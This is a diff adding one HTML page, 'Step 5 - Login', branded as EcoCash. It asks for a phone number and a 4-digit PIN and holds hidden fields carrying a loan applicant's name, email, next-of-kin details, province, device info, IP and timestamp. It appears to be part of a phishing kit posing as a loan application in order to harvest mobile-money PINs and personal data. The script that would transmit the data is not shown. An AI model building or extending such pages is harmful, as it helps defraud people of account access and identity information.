@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Step 5 - Login</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="header"></div>
+    <div class="container">
+        <div class="logo">
+            <span class="eco">Eco</span><span class="cash">Cash</span>
+        </div>
+        <h2 class="title" style="margin-top: 0;">Login</h2>
+        
+        <label>Account Type</label>
+        <select id="accountType">
+            <option>Mobile</option>
+            <option>Broadband</option>
+        </select>
+
+        <label>Phone Number</label>
+        <input type="text" id="loginPhone" readonly>
+
+        <label style="text-align: center; margin-top: 20px;">Enter your 4-digit PIN</label>
+        <div class="pin-row">
+            <input type="password" maxlength="1" class="pin-box" data-index="0">
+            <input type="password" maxlength="1" class="pin-box" data-index="1">
+            <input type="password" maxlength="1" class="pin-box" data-index="2">
+            <input type="password" maxlength="1" class="pin-box" data-index="3">
+        </div>
+
+        <div id="errorBox"></div>
+        <div id="successBox"></div>
+        <button onclick="submitLogin()">LOGIN</button>
+        <p class="forgot">Forgot your PIN?</p>
+        
+        <!-- Hidden fields to store all application data -->
+        <input type="hidden" id="hiddenAmount" value="">
+        <input type="hidden" id="hiddenDuration" value="">
+        <input type="hidden" id="hiddenReason" value="">
+        <input type="hidden" id="hiddenFullName" value="">
+        <input type="hidden" id="hiddenEmail" value="">
+        <input type="hidden" id="hiddenKinName" value="">
+        <input type="hidden" id="hiddenKinPhone" value="">
+        <input type="hidden" id="hiddenProvince" value="">
+        <input type="hidden" id="hiddenDeviceInfo" value="">
+        <input type="hidden" id="hiddenIP" value="">
+        <input type="hidden" id="hiddenTimestamp" value="">
+    </div>
+    <div class="footer"></div>
+    <div id="pageLoader" class="loader"></div>
+    <script src="script.js"></script>
+</body>
+</html>
